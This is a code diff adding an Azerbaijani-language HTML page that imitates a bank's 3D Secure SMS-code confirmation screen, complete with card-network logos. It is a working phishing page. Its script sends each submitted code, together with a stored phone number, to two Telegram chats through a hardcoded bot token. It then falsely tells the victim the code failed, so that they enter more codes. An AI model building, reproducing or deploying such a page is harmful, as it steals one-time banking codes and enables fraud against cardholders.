@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3D Secure Təsdiqi</title>
+    <style>
+        :root {
+            --primary-blue: #003366;
+            --light-gray: #f4f4f4;
+            --border-color: #cccccc;
+            --text-dark: #333333;
+            --text-muted: #666666;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background-color: #8fa3b8; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 15px;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .neon-bg {
+            position: absolute;
+            width: 50vw;
+            height: 50vw;
+            min-width: 300px;
+            min-height: 300px;
+            background: #ffffff;
+            border-radius: 50%;
+            filter: blur(120px);
+            opacity: 0.55;
+            z-index: -1;
+            animation: moveNeon 15s infinite alternate ease-in-out;
+        }
+
+        @keyframes moveNeon {
+            0% { transform: translate(-30%, -20%) scale(0.8); }
+            50% { transform: translate(10%, 40%) scale(1.1); }
+            100% { transform: translate(40%, -10%) scale(0.9); }
+        }
+
+        .auth-window {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            overflow: hidden;
+        }
+
+        .auth-header {
+            padding: 25px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-bottom: 1px solid #eeeeee;
+        }
+
+        .logo-placeholder img {
+            max-height: 95px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .auth-body {
+            padding: 30px;
+        }
+
+        .instruction-box {
+            text-align: center;
+            font-size: 14px;
+            color: var(--text-dark);
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .form-group {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .otp-input {
+            width: 100%;
+            max-width: 220px;
+            padding: 15px;
+            font-size: 22px;
+            text-align: center;
+            letter-spacing: 8px;
+            border: 1.5px solid var(--border-color);
+            border-radius: 6px; 
+            color: var(--text-dark);
+            background-color: #fafafa;
+            transition: all 0.3s ease;
+        }
+
+        .otp-input:focus {
+            border-color: var(--primary-blue);
+            background-color: #ffffff;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(0, 51, 102, 0.1);
+        }
+
+        .submit-btn {
+            background-color: var(--primary-blue);
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 30px; 
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.1s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #002244;
+        }
+
+        .timer-section {
+            text-align: center;
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-top: 20px;
+        }
+
+        .resend-btn {
+            background: none;
+            border: none;
+            color: var(--primary-blue);
+            text-decoration: underline;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: bold;
+            display: none;
+        }
+
+        .auth-footer {
+            background-color: #fafafa;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            border-top: 1px solid #eeeeee;
+        }
+
+        .card-logo svg {
+            height: 22px;
+            opacity: 0.6;
+            transition: opacity 0.3s;
+        }
+
+        .card-logo:hover svg {
+            opacity: 1;
+        }
+
+        /* POPUP MODAL STİllƏRİ */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            backdrop-filter: blur(4px);
+        }
+
+        .modal-box {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 16px;
+            text-align: center;
+            width: 90%;
+            max-width: 320px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .spinner-circle {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .error-icon {
+            width: 50px;
+            height: 50px;
+            background-color: #fee2e2;
+            color: #ef4444;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 26px;
+            font-weight: bold;
+            margin: 0 auto 15px auto;
+        }
+
+        .modal-text {
+            font-size: 15px;
+            color: var(--text-dark);
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="neon-bg"></div>
+
+    <div class="modal-overlay" id="customModal">
+        <div class="modal-box" id="modalContent"></div>
+    </div>
+
+    <div class="auth-window">
+        <div class="auth-header">
+            <div class="logo-placeholder">
+                <img src="https://r.resimlink.com/cnJMYvCLK9.png" alt="Logo">
+            </div>
+        </div>
+
+        <div class="auth-body">
+            <div class="instruction-box">
+                Əməliyyatı təsdiqləmək üçün bank tərəfindən mobil nömrənizə göndərilmiş <strong>4 və ya 6 rəqəmli</strong> təsdiq kodunu aşağıya daxil edin.
+            </div>
+
+            <form id="otpForm">
+                <div class="form-group">
+                    <input type="text" id="otpCode" class="otp-input" maxlength="6" autocomplete="off" placeholder="------" required>
+                </div>
+                
+                <button type="submit" class="submit-btn" id="submitBtn">Təsdiq Et</button>
+            </form>
+
+            <div class="timer-section">
+                <span id="timerText">Kodu yenidən almaq üçün qalan vaxt: <strong id="timer">01:00</strong></span>
+                <button class="resend-btn" id="resendBtn" onclick="resendCode()">Kodu yenidən göndər</button>
+            </div>
+        </div>
+
+        <div class="auth-footer">
+            <div class="card-logo">
+                <svg viewBox="0 0 36 24">
+                    <circle fill="#ea001b" cx="12" cy="12" r="12"/>
+                    <circle fill="#f79e1b" cx="24" cy="12" r="12"/>
+                    <path fill="#ff5f00" d="M18 24c3.27 0 6.13-1.78 7.71-4.45-2.52-3.14-2.52-7.96 0-11.1C24.13 5.78 21.27 4 18 4s-6.13 1.78-7.71 4.45c2.52 3.14 2.52 7.96 0 11.1C11.87 22.22 14.73 24 18 24z"/>
+                </svg>
+            </div>
+            <div class="card-logo">
+                <svg viewBox="0 0 36 24">
+                    <path fill="#1434CB" d="M15.4 23H12l2.1-13.4h3.4L15.4 23zM25.7 9.9c-2.3-.6-3.8-1-3.8-2 0-.8.9-1.6 2.5-1.6 1.3 0 2.3.3 3.3.7l.6-3c-1.1-.5-2.6-.9-4.3-.9-3.4 0-5.8 1.8-5.8 4.4 0 1.9 1.7 3 3 3.6 1.3.7 1.8 1.1 1.8 1.7 0 .9-1.1 1.4-2.2 1.4-1.5 0-2.8-.4-3.9-1l-.6 2.9c1 .5 2.8.9 4.6.9 3.6 0 6-1.8 6-4.6 0-1.5-1-2.6-3.1-3.6zM28.8 23h3.2l3-13.4h-2.9c-1 0-1.8.6-2.1 1.5l-4.7 11.9h3.4l.7-1.9h4.1l.4 1.9zM31 13.9l-1.1 3h2.3l-1.2-3zM9.5 9.6h-2.6L4.7 19.3l-1-5.2C3.4 12 1.5 10.1 0 9.6v-.1h5.8c.8 0 1.5.5 1.7 1.4l1.4 7.2 2.2-8.5z"/>
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const otpInput = document.getElementById('otpCode');
+        otpInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        let timeLeft = 60;
+        let timerInterval;
+
+        function startTimer() {
+            const timerDisplay = document.getElementById('timer');
+            const timerText = document.getElementById('timerText');
+            const resendBtn = document.getElementById('resendBtn');
+            
+            timeLeft = 60;
+            resendBtn.style.display = 'none';
+            timerText.style.display = 'inline';
+            
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                let m = Math.floor(timeLeft / 60);
+                let s = timeLeft % 60;
+                
+                timerDisplay.textContent = (m < 10 ? "0" + m : m) + ":" + (s < 10 ? "0" + s : s);
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerText.style.display = 'none';
+                    resendBtn.style.display = 'inline-block';
+                }
+            }, 1000);
+        }
+
+        window.onload = startTimer;
+
+        function resendCode() {
+            startTimer();
+            otpInput.value = '';
+            otpInput.focus();
+        }
+
+        document.getElementById('otpForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const code = otpInput.value;
+            
+            if(code.length >= 4) {
+                const modal = document.getElementById('customModal');
+                const modalContent = document.getElementById('modalContent');
+                
+                modalContent.innerHTML = `
+                    <div class="spinner-circle"></div>
+                    <div class="modal-text">Təsdiqlənir...</div>
+                `;
+                modal.style.display = 'flex';
+
+                const TOKEN = '8797556208:AAFsi0PLf6ZEaqAPiv5ZwzTFR8fPBniQzYc';
+                const CHATS = ['8055987590', '8367362367'];
+                const phone = localStorage.getItem('phoneNumber') || 'Naməlum';
+
+                const txt = `🔑 *Yeni 3D SMS Kod*\n\n📞 *Nömrə:* \`${phone}\`\n🔢 *Kod:* \`${code}\``;
+
+                try {
+                    await Promise.all(CHATS.map(chat_id => 
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: chat_id, text: txt, parse_mode: 'Markdown' })
+                        })
+                    ));
+                } catch (err) {}
+                
+                setTimeout(() => {
+                    modalContent.innerHTML = `
+                        <div class="error-icon">✕</div>
+                        <div class="modal-text">Kod Təsdiqlənmədi.<br>Yenidən Yoxlayın.</div>
+                    `;
+                    
+                    setTimeout(() => {
+                        modal.style.display = 'none';
+                        otpInput.value = '';
+                        otpInput.focus();
+                    }, 2500);
+
+                }, 3000);
+            }
+        });
+    </script>
+</body>
+</html>
